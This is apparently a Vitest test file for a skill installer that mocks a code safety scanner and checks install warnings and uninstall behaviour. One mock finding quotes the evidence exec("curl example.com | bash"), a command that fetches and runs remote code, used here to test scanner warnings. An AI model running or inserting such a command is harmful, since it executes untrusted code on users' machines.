import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { installSkill, uninstallSkill } from "./skills-install.js";

const runCommandWithTimeoutMock = vi.fn();
const scanDirectoryWithSummaryMock = vi.fn();

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
  return {
    ...actual,
    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
  };
});

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package","uninstall":{"kind":"node","package":"example-package"}}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
  });

  it("adds detailed warnings for critical findings and continues install", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("warns and continues when skill scan fails", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("Operation continues"))).toBe(
        true,
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});

describe("uninstallSkill", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 0,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("runs uninstall command when uninstall metadata exists", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-uninstall-"));
    try {
      await writeInstallableSkill(workspaceDir, "uninstall-skill");

      const result = await uninstallSkill({
        workspaceDir,
        skillName: "uninstall-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(runCommandWithTimeoutMock).toHaveBeenCalledWith(
        ["npm", "uninstall", "-g", "example-package"],
        expect.objectContaining({ timeoutMs: 300000 }),
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("returns an error when uninstall metadata is missing", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-uninstall-"));
    try {
      const skillDir = path.join(workspaceDir, "skills", "no-uninstall");
      await fs.mkdir(skillDir, { recursive: true });
      await fs.writeFile(
        path.join(skillDir, "SKILL.md"),
        `---
name: no-uninstall
description: no uninstall
metadata: {"openclaw":{"install":[{"id":"deps","kind":"download","url":"https://example.com/tool.tar.gz"}]}}
---

# no-uninstall
`,
        "utf-8",
      );
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 0,
        critical: 0,
        warn: 0,
        info: 0,
        findings: [],
      });

      const result = await uninstallSkill({
        workspaceDir,
        skillName: "no-uninstall",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("Uninstaller not configured");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});
